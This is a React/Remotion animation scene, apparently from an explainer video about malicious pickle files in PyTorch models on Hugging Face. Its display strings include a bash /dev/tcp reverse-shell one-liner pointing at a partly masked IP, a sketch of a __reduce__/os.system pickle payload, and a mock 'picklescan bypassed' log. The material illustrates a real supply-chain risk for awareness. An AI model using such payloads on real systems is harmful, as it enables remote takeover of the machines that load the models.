import React from "react";
import { AbsoluteFill } from "remotion";
import type { SceneProps } from "./types";
import { C, mono } from "../theme";
import { useTime, clamp, lerp, easeOut, typed, kickAt } from "../lib";
import { Source, Mono, Dot } from "../ui";
import { Dust, Scanlines, punchIn, drift } from "./BridgeFx";

const Bar: React.FC<{ p: number; w: number; color?: string }> = ({
  p,
  w,
  color = C.acid,
}) => {
  const cells = 26;
  const on = Math.round(clamp(p) * cells);
  return (
    <div style={{ display: "flex", gap: 2, fontFamily: mono }}>
      {Array.from({ length: cells }, (_, i) => (
        <div
          key={i}
          style={{
            width: (w - cells * 2) / cells,
            height: 9,
            background: i < on ? color : "rgba(233,230,223,0.08)",
            boxShadow: i < on ? `0 0 6px ${color}66` : undefined,
          }}
        />
      ))}
    </div>
  );
};

export const Pickle: React.FC<SceneProps> = ({ a, b, variant }) => {
  const t = useTime();
  const short = b - a < 1.4;
  const jump = short ? 0.9 : 0; // montage: start near the climax

  // staged progresses across the full (non-montage) window
  const load = short ? 1 : clamp((t - a - 1.0) / 1.4);
  const decode = short ? 1 : clamp((t - a - 2.2) / 0.9);
  const shell = short ? 1 : clamp((t - a - 3.0) / 0.5);
  const flash = kickAt(t) * (shell > 0.02 ? 1 : 0.2);

  const codeLines = [
    { s: ">>> model = torch.load(", c: C.bone },
    { s: '      "pytorch_model.bin",', c: C.acid },
    { s: '      map_location="cpu")', c: C.bone },
  ];
  const payload = [
    "GLOBAL      posix  system",
    "BINUNICODE  'bash -i >& /dev/tcp/193.0.››.11/4444 0>&1'",
    "REDUCE      __reduce__ → os.system(cmd)",
  ];
  const nPayload = Math.floor(decode * (payload.length + 0.5));

  // living camera: gentle push on the full shot, hard punch-in for the montage cut
  const tIn = t - a;
  const camScale = short
    ? punchIn(tIn, 1.08, 0.58)
    : 1 + easeOut(clamp(tIn / 3)) * 0.02;
  const cam = drift(t, 3, short ? 20 : 7, short ? 10 : 4, 0.12);

  return (
    <AbsoluteFill style={{ background: C.bg, overflow: "hidden" }}>
      <Dust t={t} n={26} seed={13} vx={8} vy={-3} size={2} o={0.12} />
      <div
        style={{
          position: "absolute",
          inset: 0,
          transform: `scale(${camScale}) translate(${cam.x}px, ${cam.y}px)`,
          transformOrigin: "62% 42%",
        }}
      >
        {/* file / model card (left) */}
        <div
          style={{
            position: "absolute",
            left: 150,
            top: 182,
            width: 592,
            background: C.panel,
            border: `1px solid ${C.line2}`,
            borderRadius: 12,
            overflow: "hidden",
            boxShadow: "0 40px 120px rgba(0,0,0,0.6)",
          }}
        >
          <div
            style={{
              height: 40,
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 16px",
              borderBottom: `1px solid ${C.line}`,
            }}
          >
            <Mono size={12}>huggingface.co / community-model · files</Mono>
            <Mono size={11} color={C.dim}>
              3.98 GB
            </Mono>
          </div>
          <div style={{ padding: 18 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <svg width={30} height={36} viewBox="0 0 30 36" aria-hidden>
                <path
                  d="M3 2 h16 l8 8 v24 a2 2 0 0 1-2 2 H3 a2 2 0 0 1-2-2 V4 a2 2 0 0 1 2-2 z"
                  fill="rgba(255,59,47,0.06)"
                  stroke={C.line2}
                  strokeWidth={1.2}
                />
                <path
                  d="M19 2 v8 h8"
                  fill="none"
                  stroke={C.line2}
                  strokeWidth={1.2}
                />
              </svg>
              <div>
                <div
                  style={{
                    fontFamily: mono,
                    fontSize: 22,
                    color: C.bone,
                    letterSpacing: "0.02em",
                  }}
                >
                  pytorch_model.bin
                </div>
                <div
                  style={{
                    fontFamily: mono,
                    fontSize: 12,
                    color: C.dim,
                    marginTop: 4,
                  }}
                >
                  format: pickle · torch legacy
                </div>
              </div>
            </div>
            <div
              style={{
                marginTop: 18,
                padding: "10px 12px",
                border: `1px solid rgba(255,59,47,0.4)`,
                borderRadius: 7,
                background: "rgba(255,59,47,0.05)",
                display: "flex",
                alignItems: "center",
                gap: 10,
              }}
            >
              <Dot color={C.red} size={8} />
              <span style={{ fontFamily: mono, fontSize: 13, color: C.red }}>
                executes code on load (__reduce__)
              </span>
            </div>
            <div style={{ marginTop: 14, display: "grid", gap: 7 }}>
              {[
                ["sha256", "a1f0…e9 c7"],
                ["uploaded", "anon · 2 days ago"],
                ["picklescan", decode > 0.3 ? "BYPASSED" : "scanning…"],
              ].map(([k, v], i) => (
                <div
                  key={i}
                  style={{ display: "flex", justifyContent: "space-between" }}
                >
                  <span
                    style={{ fontFamily: mono, fontSize: 12, color: C.dim }}
                  >
                    {k}
                  </span>
                  <span
                    style={{
                      fontFamily: mono,
                      fontSize: 12,
                      color:
                        k === "picklescan" && decode > 0.3 ? C.red : C.bone,
                    }}
                  >
                    {v}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* exec terminal (right) */}
        <div
          style={{
            position: "absolute",
            left: 820,
            top: 150,
            width: 950,
            height: 436,
            background: "#070807",
            border: `1px solid ${shell > 0.3 ? "rgba(255,59,47,0.5)" : C.line2}`,
            borderRadius: 12,
            overflow: "hidden",
            boxShadow: "0 40px 120px rgba(0,0,0,0.65)",
          }}
        >
          <div
            style={{
              height: 40,
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 16px",
              borderBottom: `1px solid ${C.line}`,
            }}
          >
            <Mono size={12}>python3 · load_model.py</Mono>
            <Mono size={11} color={shell > 0.3 ? C.red : C.dim}>
              {shell > 0.3 ? "● compromised" : "● running"}
            </Mono>
          </div>
          <div style={{ padding: "20px 24px", fontFamily: mono }}>
            {codeLines.map((l, i) => (
              <div
                key={i}
                style={{
                  fontSize: 18,
                  color: l.c,
                  lineHeight: 1.7,
                  opacity: clamp((t - a - 0.2 - i * 0.12) * 6 + jump * 8),
                }}
              >
                {l.s}
              </div>
            ))}
            <div
              style={{
                marginTop: 16,
                display: "flex",
                alignItems: "center",
                gap: 14,
              }}
            >
              <Bar p={load} w={340} color={shell > 0.3 ? C.red : C.acid} />
              <span style={{ fontSize: 13, color: C.dim }}>
                {Math.round(load * 100)}%
              </span>
            </div>
            <div
              style={{
                marginTop: 16,
                paddingTop: 14,
                borderTop: `1px solid ${C.line}`,
              }}
            >
              <div style={{ fontSize: 12, color: C.dim, marginBottom: 8 }}>
                unpickling · opcode stream
              </div>
              {payload.slice(0, nPayload).map((p, i) => (
                <div
                  key={i}
                  style={{
                    fontSize: 14.5,
                    color: i === payload.length - 1 ? C.red : C.bone,
                    lineHeight: 1.6,
                    whiteSpace: "nowrap",
                    textShadow:
                      i === payload.length - 1
                        ? `0 0 14px ${C.red}55`
                        : undefined,
                  }}
                >
                  {i === nPayload - 1 && !short
                    ? typed(p, t, a + 2.2 + i * 0.3, a + 2.5 + i * 0.3)
                    : p}
                </div>
              ))}
              {/* shell handshake log fills the gap as it connects */}
              {shell > 0.05 && (
                <div style={{ marginTop: 10 }}>
                  {[
                    "[*] calling os.system() during unpickle",
                    "[+] socket → 193.0.··.11:4444  (ESTABLISHED)",
                    "[+] /bin/sh spawned  pid 4812",
                  ].map((ln, i) => (
                    <div
                      key={i}
                      style={{
                        fontSize: 13.5,
                        color: i === 0 ? C.dim : C.red,
                        lineHeight: 1.7,
                        whiteSpace: "nowrap",
                        opacity: short ? 1 : clamp((shell - i * 0.22) * 4),
                      }}
                    >
                      {ln}
                      {i === 2 && (
                        <span
                          style={{
                            opacity: Math.floor(t * 2) % 2 ? 1 : 0.15,
                            color: C.red,
                          }}
                        >
                          {" "}
                          ▋
                        </span>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
          {/* reverse shell banner */}
          {shell > 0.02 && (
            <div
              style={{
                position: "absolute",
                left: 0,
                right: 0,
                bottom: 0,
                padding: "16px 24px",
                background: `rgba(255,59,47,${0.1 + flash * 0.12})`,
                borderTop: `1px solid ${C.red}`,
                display: "flex",
                alignItems: "center",
                gap: 14,
                transform: `translateY(${(1 - easeOut(shell)) * 26}px)`,
              }}
            >
              <Dot color={C.red} size={11} o={0.5 + flash * 0.5} />
              <span
                style={{
                  fontFamily: mono,
                  fontSize: 22,
                  letterSpacing: "0.18em",
                  color: C.red,
                  textTransform: "uppercase",
                  fontWeight: 700,
                }}
              >
                reverse shell connected
              </span>
              <span
                style={{
                  fontFamily: mono,
                  fontSize: 13,
                  color: C.red,
                  opacity: 0.8,
                }}
              >
                → 193.0.··.11:4444
              </span>
            </div>
          )}
        </div>

        {/* sources — right of the whisper lyric zone (x>1400), above the HUD band */}
        <Source style={{ left: 1448, top: 760, maxWidth: 420 }}>
          JFROG · 2024 · ~100 MALICIOUS MODELS ON HUGGING FACE
        </Source>
        <Source style={{ left: 1448, top: 836, maxWidth: 420 }}>
          REVERSINGLABS · FEB 2025 · "NULLIFAI" SLIPPED PAST PICKLESCAN
        </Source>
      </div>
      <Scanlines t={t} o={0.04} />
    </AbsoluteFill>
  );
};
